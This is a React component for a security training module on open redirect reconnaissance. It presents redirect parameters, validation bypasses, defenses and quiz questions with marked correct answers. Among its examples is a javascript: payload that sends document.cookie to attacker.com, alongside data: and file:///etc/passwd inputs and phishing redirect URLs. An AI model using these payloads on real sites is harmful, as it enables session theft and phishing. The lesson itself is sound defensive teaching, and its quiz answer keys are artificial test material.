import { useState } from "react";
import "./styles.scss";

export default function RedirectsReconnaissanceTask({ onComplete }) {
  const [currentStep, setCurrentStep] = useState(0);
  const [completedSteps, setCompletedSteps] = useState([]);
  const [answers, setAnswers] = useState({});

  const steps = [
    {
      id: "identify-parameters",
      title: "Identify Redirect Parameters",
      description: "Find URL parameters used for redirects",
      task: (
        <div className="task-box">
          <h4>Common Redirect Parameters</h4>
          <div className="parameters-list">
            <div className="parameter-item">
              <code>?redirect=https://example.com</code>
              <span className="param-risk high">High Risk</span>
            </div>
            <div className="parameter-item">
              <code>?url=https://attacker.com</code>
              <span className="param-risk high">High Risk</span>
            </div>
            <div className="parameter-item">
              <code>?next=/dashboard</code>
              <span className="param-risk medium">Medium Risk</span>
            </div>
            <div className="parameter-item">
              <code>?return_to=/profile</code>
              <span className="param-risk medium">Medium Risk</span>
            </div>
            <div className="parameter-item">
              <code>?goto=admin</code>
              <span className="param-risk medium">Medium Risk</span>
            </div>
          </div>

          <div className="info-box">
            <h5>Where to Look:</h5>
            <ul>
              <li>→ Login/logout pages</li>
              <li>→ OAuth/SSO flows</li>
              <li>→ Payment gateways</li>
              <li>→ Language/region selection</li>
              <li>→ Error pages with redirects</li>
            </ul>
          </div>

          <div className="example-urls">
            <h5>Real-World Examples:</h5>
            <div className="url-example">
              <strong>Banking Login:</strong>
              <code>
                https://bank.com/login?redirect=https://bank.com/dashboard
              </code>
            </div>
            <div className="url-example vulnerable">
              <strong>Vulnerable:</strong>
              <code>
                https://bank.com/login?redirect=https://evil.com/fake-bank
              </code>
            </div>
          </div>

          <div className="warning-box">
            <h5>Attack Scenario:</h5>
            <p>
              Attacker sends phishing email with trusted domain but malicious
              redirect:
              <code>
                https://trusted-bank.com/logout?next=https://attacker.com/phishing
              </code>
            </p>
            <p>
              Victim clicks, logs out from real bank, then gets redirected to
              fake login page!
            </p>
          </div>
        </div>
      ),
      question: "Which parameter is MOST commonly used for open redirects?",
      options: [
        "?id=123",
        "?redirect= or ?url= with full URL",
        "?color=blue",
        "?lang=en",
      ],
      correct: 1,
      explanation:
        "Parameters like 'redirect', 'url', 'next', 'return_to' that accept full URLs are prime targets for open redirect vulnerabilities.",
    },
    {
      id: "analyze-validation",
      title: "Analyze URL Validation",
      description: "Check if redirect URLs are validated",
      task: (
        <div className="task-box">
          <h4>URL Validation Analysis</h4>

          <div className="validation-example no-validation">
            <div className="badge danger">NO VALIDATION</div>
            <h5>Completely Vulnerable:</h5>
            <pre>
              <code>{`// Backend code
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  res.redirect(url); // Redirects ANYWHERE!
});

// Attack:
/redirect?url=https://evil.com`}</code>
            </pre>
          </div>

          <div className="validation-example weak-validation">
            <div className="badge warning">WEAK VALIDATION</div>
            <h5>Substring Check (Bypassable):</h5>
            <pre>
              <code>{`// Backend code
if (url.includes('trusted.com')) {
  res.redirect(url);
}

// Bypass:
/redirect?url=https://evil.com/trusted.com
/redirect?url=https://trusted.com.evil.com`}</code>
            </pre>
          </div>

          <div className="validation-example secure-validation">
            <div className="badge success">SECURE VALIDATION</div>
            <h5>Whitelist with Proper Parsing:</h5>
            <pre>
              <code>{`// Backend code
const allowedDomains = ['trusted.com', 'api.trusted.com'];
const parsed = new URL(url);
if (allowedDomains.includes(parsed.hostname)) {
  res.redirect(url);
} else {
  res.status(400).send('Invalid redirect');
}`}</code>
            </pre>
          </div>

          <div className="testing-checklist">
            <h5>What to Test:</h5>
            <ul>
              <li>→ No validation at all</li>
              <li>→ Substring/contains check</li>
              <li>→ Regex validation (look for flaws)</li>
              <li>→ Whitelist implementation</li>
              <li>→ Protocol restrictions (http/https only?)</li>
            </ul>
          </div>
        </div>
      ),
      question:
        "Why is substring validation (url.includes('trusted.com')) weak?",
      options: [
        "It's not weak, it's secure",
        "Attacker can use trusted.com.evil.com or evil.com/trusted.com to bypass",
        "It's too slow",
        "It only works with HTTPS",
      ],
      correct: 1,
      explanation:
        "Substring checks don't verify the actual domain. Attackers can include the trusted string anywhere in their malicious URL to bypass the check.",
    },
    {
      id: "test-protocols",
      title: "Test Protocol Handling",
      description: "Check javascript: and data: protocols",
      task: (
        <div className="task-box">
          <h4>Dangerous Protocols</h4>

          <div className="protocol-attack">
            <h5>JavaScript Protocol XSS:</h5>
            <div className="attack-example">
              <code>?redirect=javascript:alert(document.cookie)</code>
              <p className="attack-result">
                → Executes JavaScript in victim's browser! (XSS via redirect)
              </p>
            </div>
            <div className="attack-example">
              <code>
                ?url=javascript:fetch('https://attacker.com?c='+document.cookie)
              </code>
              <p className="attack-result">→ Steals session cookies!</p>
            </div>
          </div>

          <div className="protocol-attack">
            <h5>Data URI Attack:</h5>
            <div className="attack-example">
              <code>
                ?redirect=data:text/html,&lt;script&gt;alert('XSS')&lt;/script&gt;
              </code>
              <p className="attack-result">
                → Renders HTML with embedded scripts
              </p>
            </div>
          </div>

          <div className="protocol-attack">
            <h5>File Protocol:</h5>
            <div className="attack-example">
              <code>?next=file:///etc/passwd</code>
              <p className="attack-result">
                → May expose local files (context-dependent)
              </p>
            </div>
          </div>

          <div className="safe-protocols">
            <h5>Safe Protocols (Whitelist):</h5>
            <div className="protocol-list">
              <div className="protocol safe">✓ http://</div>
              <div className="protocol safe">✓ https://</div>
              <div className="protocol safe">✓ /relative/path</div>
            </div>
          </div>

          <div className="danger-protocols">
            <h5>Dangerous Protocols (Block):</h5>
            <div className="protocol-list">
              <div className="protocol danger">✗ javascript:</div>
              <div className="protocol danger">✗ data:</div>
              <div className="protocol danger">✗ file:</div>
              <div className="protocol danger">✗ vbscript:</div>
            </div>
          </div>

          <div className="info-box">
            <h5>Defense:</h5>
            <pre>
              <code>{`const url = new URL(redirectUrl, 'https://trusted.com');
if (!['http:', 'https:'].includes(url.protocol)) {
  throw new Error('Invalid protocol');
}`}</code>
            </pre>
          </div>
        </div>
      ),
      question: "What can javascript: protocol in redirect cause?",
      options: [
        "Nothing dangerous",
        "XSS - JavaScript execution in user's browser, potentially stealing session cookies",
        "Faster redirects",
        "Better SEO",
      ],
      correct: 1,
      explanation:
        "The javascript: protocol allows arbitrary JavaScript execution, turning an open redirect into an XSS vulnerability that can steal cookies, session tokens, or perform actions on behalf of the user.",
    },
    {
      id: "document-findings",
      title: "Document Findings",
      description: "Create reconnaissance report",
      task: (
        <div className="task-box">
          <h4>Reconnaissance Report</h4>

          <div className="report-template">
            <div className="report-section">
              <h5>1. Identified Redirect Parameters:</h5>
              <table className="findings-table">
                <thead>
                  <tr>
                    <th>Endpoint</th>
                    <th>Parameter</th>
                    <th>Validation</th>
                    <th>Risk</th>
                  </tr>
                </thead>
                <tbody>
                  <tr className="critical">
                    <td>
                      <code>/login</code>
                    </td>
                    <td>
                      <code>?redirect=</code>
                    </td>
                    <td>None</td>
                    <td>Critical</td>
                  </tr>
                  <tr className="high">
                    <td>
                      <code>/oauth/callback</code>
                    </td>
                    <td>
                      <code>?return_url=</code>
                    </td>
                    <td>Weak substring</td>
                    <td>High</td>
                  </tr>
                  <tr className="medium">
                    <td>
                      <code>/logout</code>
                    </td>
                    <td>
                      <code>?next=</code>
                    </td>
                    <td>Protocol check</td>
                    <td>Medium</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <div className="report-section">
              <h5>2. Validation Weaknesses:</h5>
              <ul className="weaknesses-list">
                <li className="weakness critical">
                  <strong>No validation on /login redirect parameter</strong>
                  <p>Accepts any URL including javascript: protocol</p>
                </li>
                <li className="weakness high">
                  <strong>Substring check on /oauth/callback</strong>
                  <p>Can be bypassed with evil.com?target=trusted.com</p>
                </li>
                <li className="weakness medium">
                  <strong>No domain whitelist</strong>
                  <p>Only protocol is checked (http/https)</p>
                </li>
              </ul>
            </div>

            <div className="report-section">
              <h5>3. Attack Vectors:</h5>
              <div className="attack-vectors">
                <div className="vector">
                  <span className="vector-type">Phishing</span>
                  <code>
                    https://trusted.com/login?redirect=https://fake-trusted.com
                  </code>
                </div>
                <div className="vector">
                  <span className="vector-type">XSS</span>
                  <code>
                    https://trusted.com/login?redirect=javascript:alert(1)
                  </code>
                </div>
                <div className="vector">
                  <span className="vector-type">OAuth Hijack</span>
                  <code>
                    https://trusted.com/oauth?return_url=https://attacker.com/steal
                  </code>
                </div>
              </div>
            </div>

            <div className="report-section">
              <h5>4. Recommendations:</h5>
              <ol className="recommendations">
                <li>→ Implement strict domain whitelist</li>
                <li>→ Use URL parsing (new URL()) not substring checks</li>
                <li>→ Block dangerous protocols (javascript:, data:, file:)</li>
                <li>→ Prefer relative paths over absolute URLs</li>
                <li>→ Add CSRF tokens for redirect endpoints</li>
              </ol>
            </div>
          </div>

          <div className="success-box">
            <h5>Phase Complete!</h5>
            <p>
              You've identified redirect parameters, analyzed validation, and
              documented findings.
            </p>
          </div>
        </div>
      ),
      question: "What should a good redirect reconnaissance report include?",
      options: [
        "Only a list of all URLs",
        "Parameters, validation methods, identified weaknesses, attack vectors, and recommendations",
        "Just the exploit code",
        "User credentials",
      ],
      correct: 1,
      explanation:
        "A comprehensive reconnaissance report documents all redirect parameters, analyzes their validation, identifies specific weaknesses, demonstrates potential attack vectors, and provides actionable security recommendations.",
    },
  ];

  const handleAnswer = (stepIndex, selectedOption) => {
    const step = steps[stepIndex];
    const isCorrect = selectedOption === step.correct;

    setAnswers((prev) => ({
      ...prev,
      [stepIndex]: {
        selected: selectedOption,
        correct: isCorrect,
      },
    }));

    if (isCorrect && !completedSteps.includes(stepIndex)) {
      const newCompleted = [...completedSteps, stepIndex];
      setCompletedSteps(newCompleted);

      if (newCompleted.length === steps.length) {
        onComplete?.("reconnaissance");
      }
    }
  };

  const goNext = () => {
    if (currentStep < steps.length - 1) {
      setCurrentStep(currentStep + 1);
    }
  };

  const goPrev = () => {
    if (currentStep > 0) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleRestart = () => {
    setCurrentStep(0);
    setCompletedSteps([]);
    setAnswers({});
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const step = steps[currentStep];
  const answered = answers[currentStep];

  return (
    <div className="redirects-reconnaissance-container">
      <div className="content-section">
        <h2 className="step-title">{step.title}</h2>
        <p className="step-description">{step.description}</p>

        {step.task}

        <div className="question-container">
          <h4 className="question-title">{step.question}</h4>

          <div className="options-container">
            {step.options.map((option, idx) => {
              const isSelected = answered?.selected === idx;
              const isCorrect = idx === step.correct;
              const showResult = answered && isSelected;

              return (
                <button
                  key={idx}
                  onClick={() => handleAnswer(currentStep, idx)}
                  disabled={answered !== undefined}
                  className={`option-button ${
                    showResult
                      ? isCorrect
                        ? "correct"
                        : "incorrect"
                      : isSelected
                      ? "selected"
                      : ""
                  }`}
                >
                  <span className="option-icon">
                    {showResult ? (isCorrect ? "✓" : "✗") : "○"}
                  </span>
                  {option}
                </button>
              );
            })}
          </div>

          {answered && (
            <div
              className={`feedback-box ${
                answered.correct ? "correct" : "incorrect"
              }`}
            >
              <p className="feedback-title">
                {answered.correct ? "Correct!" : "Incorrect"}
              </p>
              <p className="feedback-explanation">{step.explanation}</p>
              {!answered.correct && (
                <div className="restart-prompt">
                  <p className="restart-text">
                    Don't worry! Learning from mistakes is part of the process.
                    You can restart this phase to try again.
                  </p>
                  <button onClick={handleRestart} className="restart-button">
                    Restart Phase
                  </button>
                </div>
              )}
            </div>
          )}
        </div>
        <div className="navigation-buttons">
          <button
            onClick={goPrev}
            disabled={currentStep === 0}
            className="nav-button prev-button"
          >
            Previous
          </button>

          {completedSteps.includes(currentStep) &&
            currentStep < steps.length - 1 && (
              <button onClick={goNext} className="nav-button next-button">
                Next
              </button>
            )}

          {completedSteps.length === steps.length && (
            <button className="nav-button complete-button">
              Phase completed!
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
